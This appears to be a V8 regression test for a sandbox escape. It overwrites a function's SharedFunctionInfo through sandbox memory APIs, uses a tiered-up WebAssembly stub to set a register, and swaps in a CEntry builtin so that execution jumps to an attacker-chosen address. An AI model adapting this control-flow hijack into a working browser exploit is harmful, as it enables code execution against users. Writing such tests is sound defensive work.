// Copyright 2025 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --sandbox-testing

// get a compatible function (ie. dispatch entry says it takes 0 params)
const victim = (() => {}).__proto__;

// we want maglev to call the victim via dispatch as the code will later be changed
// change victim's SFI now so maglev doesn't recognize the builtin and inline the call to it
const dummy = () => {};
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const kSharedFunctionInfoOffset = Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdFor("JS_FUNCTION"), "shared_function_info");
memory.setUint32(
    Sandbox.getAddressOf(victim) + kSharedFunctionInfoOffset,
    memory.getUint32(Sandbox.getAddressOf(dummy) + kSharedFunctionInfoOffset)
);

// a function that lets us control rbx via the last argument
const {stub} = new WebAssembly.Instance(new WebAssembly.Module(Uint8Array.fromBase64(
    // (module (func (export "stub") (param i64 i64 i64 i64) return))
    "AGFzbQEAAAABCAFgBH5+fn4AAwIBAAcIAQRzdHViAAAKBQEDAA8LAAoEbmFtZQIDAQAA"
))).exports;

// tier it up so it can set rbx
for (let i = 0; i < 0x100000; i++) stub(0n, 0n, 0n, 0n);

const call = (addr) => {
  stub(0n, 0n, 0n, addr);
  victim();
};
%PrepareFunctionForOptimization(call);
call(0n);
%OptimizeMaglevOnNextCall(call);
call(1n);

// this builtin will call rbx which we set via stub
Sandbox.setFunctionCodeToBuiltin(victim, Sandbox.getBuiltinNames().indexOf("CEntry_Return1_ArgvOnStack_NoBuiltinExit"));
call(0x424242424242n);
